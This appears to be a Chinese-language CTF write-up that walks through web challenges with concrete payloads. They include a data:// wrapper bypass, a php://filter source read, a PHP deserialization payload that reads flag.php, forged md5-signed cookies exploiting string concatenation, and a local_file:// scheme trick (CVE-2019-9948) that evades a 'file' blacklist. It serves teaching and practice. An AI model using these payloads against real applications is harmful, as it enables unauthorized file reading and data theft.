１．首先需要绕过以下代码

利用file_get_contents()可以读取data://text/plain;base64,的数据流来进行绕过

payload:

text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=

２．阅读ｐｈｐ源代码，我们可以发现file的变量是可以控制的，但是却无法直接读取flag.php里的内容，因为以下代码进行过滤了

但是我们代码审计，可以看到有提示useless.php ，因此我们可以尝试读取useless.php 的内容，直接file=useless.php，内容是无法显示的，因此需要用到php://filter来读取源码

payload:

?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=php://filter/read=convert.base64-encode/resource=useless.php

再进行base64解码后得到了一段ｐｈｐ源代码

进行代码审计我们可以发现是要利用反序列化漏洞

最终payload:

?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}

２．字符串拼接

​ 上面的代码审计分析我们可以知道在访问/geneSign?param=xxxx，他会将md5值返回到前端。因此我们可以利用它生成md5值并回显到前端的特点，让它替我们生成可以利用的md5值。然后在将这个md5值用sign传入到/De1ta，进而调用Task类。绕过检查函数获得flag

​ 试着访问了一下 /geneSign?param=flag.txt ，给出了一个 md5 1502e8565ba91e3a57e7042f9e5cbc8a ，但是通过代码我们可以发现action只有固定值scan ，我们要利用 read 功能就要另想办法了。

看以下方法我们可以发现这个拼接是有问题的。

不妨假设 secert_key 是 xxx ，那么在开始访问 /geneSign?param=flag.txt 的时候，返回的 md5 就是 md5('xxx' + 'flag.txt' + 'scan') ，在 python 里面上述表达式就相当于 md5(xxxflag.txtscan) ，这就很有意思了。

同时他是用in来判断的，只要我们的action拥有read字符串就行了，这是存在漏洞的

那我们要能利用read，直接构造访问 /geneSign?param=flag.txtread ，拿到的 md5 就是 md5('xxx' + 'flag.txtread' + 'scan') ，等价于 md5('xxxflag.txtreadscan') ，这就达到了目标。

直接访问 /De1ta?param=flag.txt 构造 cookie action=readscan;sign=6ed0792d878216e6174bef5a8101bcd0 即可

直接访问 /De1ta?param=flag.txt 构造 cookie action=readscan;sign=83f1677c4f33c39b90a7d0ab074c9f94 进行尝试

３．local_file

天枢大佬们的做法 : https://xz.aliyun.com/t/5921#toc-16

他们的 exp(我稍微修改成py3) :

请求 /geneSign?param=local_file:///app/flag.txtread 获取 md5 值为 e0f3cd0f7fa7c955a4de181629850a3c ，即 md5(secert_key + 'local_file:///app/flag.txtread' + 'scan')

然后再请求 /De1ta?param=local_file:///app/flag.txt 构造 cookie action=readscan;sign=e0f3cd0f7fa7c955a4de181629850a3c

关于 local_file :[security][CVE-2019-9948] Unnecessary URL scheme exists to allow local_file:// reading file in urllib

参考 : https://bugs.python.org/issue35907

这里是使用的 urllib.urlopen(param) 去包含的文件，所以可以直接加上文件路径 flag.txt 或 ./flag.txt 去访问，也可以使用类似的 file:///app/flag.txt 去访问，但是 file 关键字在黑名单里，可以使用 local_file 代替。

如果使用 urllib2.urlopen(param) 去包含文件就必须加上 file ，否则会报 ValueError: unknown url type: /path/to/file 的错误。
